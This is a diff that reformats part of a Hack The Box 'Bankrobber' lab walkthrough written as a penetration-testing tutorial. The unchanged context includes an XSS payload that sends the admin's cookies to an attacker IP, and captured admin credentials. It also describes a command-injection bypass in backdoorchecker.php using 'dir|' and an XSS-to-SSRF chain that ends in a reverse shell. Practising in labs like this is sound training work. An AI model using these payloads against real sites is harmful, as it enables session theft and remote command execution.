@@ -38,21 +38,21 @@ Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 MariaDB is very similar to MySQL and uses the same SQL syntax. After navigating to the URL [http://bankrobber.htb](http://bankrobber.htb) we find a Bitcoin trading platform called E-coin.
 
-![Home page of Bankrobber](../.gitbook/assets/0%20%281%29%20%282%29.png)
+![Home page of Bankrobber](<../.gitbook/assets/0 (1) (2).png>)
 
-There is a login function and below that a place to register new accounts. If we register an account with username 'john' and password 'password' and then login, we are taken to a page that allows us to transfer E-coin to \(presumably\) another user using the ID of the user.
+There is a login function and below that a place to register new accounts. If we register an account with username 'john' and password 'password' and then login, we are taken to a page that allows us to transfer E-coin to (presumably) another user using the ID of the user.
 
-![Transfer E-coin function of Bankrobber](../.gitbook/assets/1%20%283%29.png)
+![Transfer E-coin function of Bankrobber](<../.gitbook/assets/1 (3).png>)
 
 If we right click on the page and select Inspect Element to go into the developer tools of the browser, we can navigate to the Storage tab and look at the Cookies that have been set. The cookies are:
 
-```text
+```
 id: 3
 password: cGFzc3dvcmQ%3D
 username: am9obg%3D%3D
 ```
 
-The username and password cookies are simply the Base64 encoded versions of "john" and "password" which you can verify for yourself. We can see that the id of the user is 3 and so it suggests that there are at least 2 other users \(1 and 2\) on the system.
+The username and password cookies are simply the Base64 encoded versions of "john" and "password" which you can verify for yourself. We can see that the id of the user is 3 and so it suggests that there are at least 2 other users (1 and 2) on the system.
 
 If we submit a transaction by entering 100 as the amount, 2 as the id and a comment of "test", a popup reports "Transfer on hold. An admin will review it within a minute. After that he will decide whether the transaction will be dropped or not.".
 
@@ -80,7 +80,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.70.254 - - [25/Feb/2021 10:38:08] "GET /img.jpg HTTP/1.1" 404 -
 ```
 
-So we know that XSS works. The first thing we can do is to steal the administrator's cookies. We know that the cookies used on the site simply consist of the username and password Base64 encoded. To get them we can use the JavaScript function document.cookie\(\) in the following way:
+So we know that XSS works. The first thing we can do is to steal the administrator's cookies. We know that the cookies used on the site simply consist of the username and password Base64 encoded. To get them we can use the JavaScript function document.cookie() in the following way:
 
 ```javascript
 <img src=x onerror=this.src="http://10.10.14.135/?c="+document.cookie />
@@ -88,12 +88,12 @@ So we know that XSS works. The first thing we can do is to steal the administrat
 
 This returns the base64 for both username and password to be "admin" and "Hopelessromantic":
 
-```text
+```
 10.129.70.254 - - <SNIP> "GET /?c=username=YWRtaW4%3D;
     %20password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D;%20id=1 HTTP/1.1" 200 -
 ```
 
-After doing the SQL Injection to read source code \(see later in the SQL injection section\), you discover a php file called backdoorchecker.php that will execute a "dir" command supplied as POST parameter. However, the check only tests if the first three characters are equal to "dir". By adding a "\|" after "dir" you can add any other Windows command. The file backdoorchecker.php also checks that the request came from the same machine checking that the "REMOTE\_ADDR" is equal to "::1" the IPv6 localhost address.
+After doing the SQL Injection to read source code (see later in the SQL injection section), you discover a php file called backdoorchecker.php that will execute a "dir" command supplied as POST parameter. However, the check only tests if the first three characters are equal to "dir". By adding a "|" after "dir" you can add any other Windows command. The file backdoorchecker.php also checks that the request came from the same machine checking that the "REMOTE\_ADDR" is equal to "::1" the IPv6 localhost address.
 
 To exploit backdoorchecker.php, you can use the XSS to do an SSRF attack. To validate that this will work, you will write a JavaScript file hosted from our machine and test a "ping" command. Writing a script attack.js as follows:
 
@@ -148,7 +148,7 @@ To install Impacket in the /opt directory, you can use:
 
 You can then run smbserver.py directly from /opt/impacket/examples/smbserver.py
 
-\([https://github.com/SecureAuthCorp/impacket\](https://github.com/SecureAuthCorp/impacket\)\). To share a directory using smbserver you use the syntax:
+([https://github.com/SecureAuthCorp/impacket\\](https://github.com/SecureAuthCorp/impacket/)). To share a directory using smbserver you use the syntax:
 
 ```bash
 ┌─[✗]─[rin@parrot]─[~/boxes/Bankrobber]
@@ -183,4 +183,3 @@ bankrobber\cortin
 ```
 
 This is not the end of the box, we have a reverse shell as the user cortin but the next part is privilege escalation which involves a buffer overflow, something we will deal with in Chapter 6.
-
